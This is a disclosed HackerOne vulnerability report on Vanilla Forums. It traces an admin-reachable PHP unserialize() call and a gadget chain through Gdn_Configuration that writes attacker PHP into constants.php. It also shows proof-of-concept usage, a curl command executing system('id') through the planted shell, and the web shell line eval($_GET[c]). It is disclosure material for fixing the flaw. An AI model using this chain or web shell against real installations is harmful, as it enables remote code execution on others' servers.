@@ -1,0 +1,420 @@
+ReportLink:https://hackerone.com/reports/407552
+WeaknessName:Deserialization of Untrusted Data
+Reporter:https://hackerone.com/mr_me
+ReportedTo:Vanilla(vanilla)
+BountyAmount:600.0
+Severity:critical
+State:Closed
+DateOfDisclosure:23.11.2018 15:47:15
+
+Summary:
+
+**Summary:**
+
+An authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution.
+
+**Description:**
+
+Please bare with me on this one, it's heavy. Ok, so after setting a Garden.TouchIcon setting (it can be several settings, this is just an example of one) we can reach an the code in renderMaster inside of the library/core/class.controller.php file.
+
+```
+class Gdn_Controller extends Gdn_Pluggable {
+
+    ...
+
+    public function renderMaster() {
+        // Build the master view if necessary
+        if (in_array($this->_DeliveryType, [DELIVERY_TYPE_ALL])) {
+
+        ...
+
+            $touchIcon = c('Garden.TouchIcon');                                     // 1
+            if ($touchIcon) {
+                $this->Head->setTouchIcon(Gdn_Upload::url($touchIcon));
+            }
+```
+
+At [1] we see a call to the function c(). As it turns out, that function is just a macro for the call in library/core/functions.general.php
+
+```
+if (!function_exists('config')) {
+    /**
+     * Retrieves a configuration setting.
+     *
+     * @param string|bool $name The name of the configuration setting.
+     * Settings in different sections are separated by dots.
+     * @param mixed $default The result to return if the configuration setting is not found.
+     * @return mixed The configuration setting.
+     * @see Gdn::config()
+     */
+    function config($name = false, $default = false) {                              // 2
+        return Gdn::config($name, $default);
+    }
+}
+```
+
+At [2] we see the call to Gdn::config which is using the 'Garden.TouchIcon' setting. This function is defined in library/core/class.gdn.php.
+
+```
+class Gdn {
+
+    ...
+
+    /**
+     * Get a configuration setting for the application.
+     *
+     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot ('.')
+     * @param mixed $default The result to return if the configuration setting is not found.
+     * @return Gdn_Configuration|mixed The configuration setting.
+     */
+    public static function config($name = false, $default = false) {
+        if (self::$_Config === null) {
+            self::$_Config = static::getContainer()->get(self::AliasConfig);
+        }
+        $config = self::$_Config;
+        if ($name === false) {
+            $result = $config;
+        } else {
+            $result = $config->get($name, $default);        // 3
+        }
+
+        return $result;
+    }
+```
+
+At [3] the code calls get() on the Gdn_Configuration class using using the 'Garden.TouchIcon'. This code is defined in library/core/class.configuration.php:
+
+```
+class Gdn_Configuration extends Gdn_Pluggable {
+
+    ...
+
+    public function get($name, $defaultValue = false) {
+        // Shortcut, get the whole config
+        if ($name == '.') {
+            return $this->Data;
+        }
+
+        $keys = explode('.', $name);
+        // If splitting is off, HANDLE IT
+        if (!$this->splitting) {
+//         $FirstKey = getValue(0, $Keys);
+            $firstKey = $keys[0];
+            if ($firstKey == $this->defaultGroup) {
+                $keys = [array_shift($keys), implode('.', $keys)];
+            } else {
+                $keys = [$name];
+            }
+        }
+        $keyCount = count($keys);
+
+        $value = $this->Data;
+        for ($i = 0; $i < $keyCount; ++$i) {
+            if (is_array($value) && array_key_exists($keys[$i], $value)) {
+                $value = $value[$keys[$i]];
+            } else {
+                return $defaultValue;
+            }
+        }
+
+        if (is_string($value)) {
+            $result = Gdn_Format::unserialize($value);                          // 4
+        } else {
+            $result = $value;
+        }
+
+        return $result;
+    }
+```
+
+At [4] we can see the static call to unserialize in the Gdn_Format and as suspected, inside of library/core/class.format.php we can see the following code:
+
+```
+class Gdn_Format {
+
+    ...
+
+    /**
+     * Takes a serialized variable and unserializes it back into its original state.
+     * 
+     * @param string $serializedString A json or php serialized string to be unserialized.
+     * @return mixed
+     */
+    public static function unserialize($serializedString) {
+        $result = $serializedString;
+
+        if (is_string($serializedString)) {
+            if (substr_compare('a:', $serializedString, 0, 2) === 0 || substr_compare('O:', $serializedString, 0, 2) === 0) {
+                $result = unserialize($serializedString);                          // 5
+            } elseif (substr_compare('obj:', $serializedString, 0, 4) === 0) {
+                $result = json_decode(substr($serializedString, 4), false);
+            } elseif (substr_compare('arr:', $serializedString, 0, 4) === 0) {
+                $result = json_decode(substr($serializedString, 4), true);
+            }
+        }
+        return $result;
+    }
+```
+
+At [5] we can reach the vulnerable unserialize with attacker controlled input
+
+Exploitation:
+=============
+
+Of course, theory is great but poc||gtfo? Well, as it turns out, there are a few options for us to pick from.
+
+saturn:vanilla mr_me$ grep --color=always -ir "__destruct" .
+./library/database/class.dataset.php:    public function __destruct() {
+./library/core/class.proxyrequest.php:    public function __destruct() {
+./library/core/class.configuration.php:    public function __destruct() {
+
+The Gdn_DataSet class is useless to us, however the ProxyRequest class seems a little bit more interesting: 
+
+```
+class ProxyRequest {
+
+    ...
+
+    public function __destruct() {
+        if (file_exists($this->CookieJar)) {
+            unlink($this->CookieJar);
+        }
+    }
+```
+
+This can of course allow us to delete files from the remote system. Be careful here, as attackers can wipe the .htaccess files and weaken the security posture of the application. However, the prime candidate is RCE, so we opted for the next class, the Gdn_Configuration class of course! (how meta).
+
+Ok so life is born in Gdn_Configuration's __destruct:
+
+```
+class Gdn_Configuration extends Gdn_Pluggable {
+
+    ...
+
+    /**
+     *
+     */
+    public function __destruct() {
+        if ($this->autoSave) {                      // 1
+            $this->shutdown();                      // 2
+        }
+    }
+
+    /**
+     *
+     */
+    public function shutdown() {
+        foreach ($this->sources as $source) {
+            $source->shutdown();                    // 3
+        }
+    }
+```
+
+We can reach the shutdown() call at [2] if we set the autoSave property at [1]. Then at [3] we can call shutdown again, but on a different class, presumably the Gdn_ConfigurationSource class.
+
+```
+class Gdn_ConfigurationSource extends Gdn_Pluggable {
+
+    ...
+
+    /**
+     *
+     *
+     * @throws Exception
+     */
+    public function shutdown() {
+        if ($this->Dirty) {                 // 4
+            $this->save();                  // 5
+        }
+    }
+```
+
+We can reach the save() call at [5] by setting the dirty property at [4].
+
+```
+class Gdn_ConfigurationSource extends Gdn_Pluggable {
+
+    ...
+
+    /**
+     *
+     * 
+     * @return bool|null
+     * @throws Exception
+     */
+    public function save() {
+        if (!$this->Dirty) {
+            return null;
+        }
+
+        $this->EventArguments['ConfigDirty'] = &$this->Dirty;
+        $this->EventArguments['ConfigNoSave'] = false;
+        $this->EventArguments['ConfigType'] = $this->Type;
+        $this->EventArguments['ConfigSource'] = $this->Source;
+        $this->EventArguments['ConfigData'] = $this->Settings;
+        $this->fireEvent('BeforeSave');
+
+        if ($this->EventArguments['ConfigNoSave']) {
+            $this->Dirty = false;
+            return true;
+        }
+
+        // Check for and fire callback if one exists
+        if ($this->Callback && is_callable($this->Callback)) {
+            $callbackOptions = [];
+            if (!is_array($this->CallbackOptions)) {
+                $this->CallbackOptions = [];
+            }
+
+            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [
+                'ConfigDirty' => $this->Dirty,
+                'ConfigType' => $this->Type,
+                'ConfigSource' => $this->Source,
+                'ConfigData' => $this->Settings,
+                'SourceObject' => $this
+            ]);
+
+            $configSaved = call_user_func($this->Callback, $callbackOptions);
+
+            if ($configSaved) {
+                $this->Dirty = false;
+                return true;
+            }
+        }
+
+        switch ($this->Type) {                              // 6
+            case 'file':
+                if (empty($this->Source)) {
+                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);
+                }
+
+                $checkWrite = $this->Source;
+                if (!file_exists($checkWrite)) {
+                    $checkWrite = dirname($checkWrite);
+                }
+
+                if (!is_writable($checkWrite)) {
+                    throw new Exception(sprintf(t("Unable to write to config file '%s' when saving."), $this->Source));
+                }
+
+                $group = $this->Group;                                                              // 7
+                $data = &$this->Settings;
+                if ($this->Configuration) {
+                    ksort($data, $this->Configuration->getSortFlag());
+                }
+
+                // Check for the case when the configuration is the group.
+                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {
+                    $data = $data[$group];
+                }
+
+                // Do a sanity check on the config save.
+                if ($this->Source == Gdn::config()->defaultPath()) {
+                    // Log root config changes
+                    try {
+                        $logData = $this->Initial;
+                        $logData['_New'] = $this->Settings;
+                        LogModel::insert('Edit', 'Configuration', $logData);
+                    } catch (Exception $ex) {
+                    }
+
+                    if (!isset($data['Database'])) {
+                        if ($pm = Gdn::pluginManager()) {
+                            $pm->EventArguments['Data'] = $data;
+                            $pm->EventArguments['Backtrace'] = debug_backtrace();
+                            $pm->fireEvent('ConfigError');
+                        }
+                        return false;
+                    }
+                }
+
+                $options = [
+                    'VariableName' => $group,                                                   // 8
+                    'WrapPHP' => true,
+                    'ByLine' => true
+                ];
+
+                if ($this->Configuration) {
+                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9
+                }
+
+                // Write config data to string format, ready for saving
+                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10
+
+                if ($fileContents === false) {
+                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);
+                }
+
+                // Save to cache if we're into that sort of thing
+                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);
+                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {
+                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [
+                        Gdn_Cache::FEATURE_NOPREFIX => true,
+                        Gdn_Cache::FEATURE_EXPIRY => 3600
+                    ]);
+                }
+
+                $tmpFile = tempnam(PATH_CONF, 'config');
+                $result = false;
+                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11
+                    chmod($tmpFile, 0775);
+                    $result = rename($tmpFile, $this->Source);                                              // 12
+                }
+```
+
+Ok so at [6] we trigger a switch statement and want to land into the 'file' block. Then at [7] we want to set `$group` from `$this->Group` to some PHP code. This will become apparent soon.
+
+Then at [8] we set `$options` to be an associative array containing our controlled `$group` at 'VariableName'. At [9] that array is merged with another array and then at [10] a call to format() is made. This has been excluded from the analysis but essentially, we can set a global variable in there using our controlled 'VariableName' value.
+
+Now after [10] we have our PHP code in `$fileContents` is then placed into a random file in the config directory at [11]. Finally, at [12] the random file is renamed to the attackers supplied filename using `$this->Source`.
+
+This can allow remote code execution. In the exploit, I choose to use 'constants.php' as a target for a few reasons:
+
+1. We have a "show stopper" as its know, which is `if (!defined('APPLICATION')) exit();`. This wont allow us to execute PHP code directly
+   even if we delete the .htaccess using the other potential pop chain.
+
+   This contants.php file is included into the web root of the application, so we can execute the injected PHP code from the index page.
+
+2. The config folder is naturally writable due to the caching in the same directory and that the code contantantly (pun intended) updates the config.php file.
+
+Remember to snapshot or backup your installation before running this exploit. It DOES NOT attempt to clean up after exploitation.
+
+## Example:
+
+```
+saturn:~ mr_me$ ./poc.py 
+(+) usage: poc.py <target> <cookie>
+(+) eg: poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg
+
+saturn:~ mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg
+(+) targeting: http://172.16.175.143
+(+) shell injected into contants.php successfully!
+(+) shell at: http://172.16.175.143/?c=phpinfo();
+
+saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');" | cut -d "<" -f1
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Now, on the target system:
+
+```
+steven@pluto:/var/www/html/conf$ cat constants.php 
+<?php if (!defined('APPLICATION')) exit();
+$a=eval($_GET[c]);//[''] = '';
+
+// Last edited by admin (172.16.175.1)2018-09-08 20:35:19
+```
+
+## Steps to reproduce:
+
+1. Backup your installation.
+2. Login as an admin and get the Vanilla cookie
+3. Run the poc against your target with the cookie.
+
+## Anything else we should know?
+
+Give me a few days and I'll write you a patch. Basically you just need a `__wakeUp` call in the Gdn_Configuration class.
+
+## Impact
+
+High, RCE.
